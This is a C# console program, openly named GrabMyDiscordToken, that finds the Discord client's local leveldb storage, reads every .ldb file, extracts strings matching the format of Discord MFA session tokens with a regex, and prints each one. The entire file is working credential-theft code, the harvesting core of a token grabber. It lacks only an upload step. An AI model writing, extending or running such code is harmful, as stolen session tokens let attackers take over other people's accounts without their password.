namespace GrabMyDiscordToken
{
    using System;
    using System.IO;
    using System.Text.RegularExpressions;

    internal static class Program
    {
        /// <summary>
        /// The discord token regex format.
        ///   - Format: The token must start with a 'mfa.' and be followed by alphabet characters.
        /// </summary>
        private const string DISCORD_TOKEN_REGEX_FORMAT = @"mfa.([A-Za-z])\w+";
        
        /// <summary>
        /// Defines the entry point of the application.
        /// </summary>
        /// <param name="Args">The arguments.</param>
        private static void Main(string[] Args)
        {
            var RegexModel = new Regex(DISCORD_TOKEN_REGEX_FORMAT);

            // 
            // Build a path to the folder storing the database files.
            // 

            var DiscordFolderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord");
            var StorageFolderPath = Path.Combine(DiscordFolderPath, "Local Storage/leveldb/");

            if (Directory.Exists(StorageFolderPath) == false)
            {
                goto End;
            }

            // 
            // Search for every .ldb files.
            // 

            var DatabaseFilePaths = Directory.GetFiles(StorageFolderPath, "*.ldb", SearchOption.TopDirectoryOnly);

            if (DatabaseFilePaths.Length == 0)
            {
                goto End;
            }

            // 
            // For each database file...
            // 

            foreach (var DatabaseFilePath in DatabaseFilePaths)
            {
                var DatabaseFileContent = (string) null;

                try
                {
                    DatabaseFileContent = File.ReadAllText(DatabaseFilePath);
                }
                catch (Exception)
                {
                    continue;
                }

                // 
                // Search for the discord token...
                // 

                var Matches = RegexModel.Matches(DatabaseFileContent);

                if (Matches.Count == 0)
                {
                    continue;
                }

                // 
                // For each token format matches...
                // 

                foreach (var Match in Matches)
                {
                    Console.WriteLine($"[*] Token: {Match}");
                }
            }

        End:
            Console.ReadKey(intercept: true);
        }
    }
}
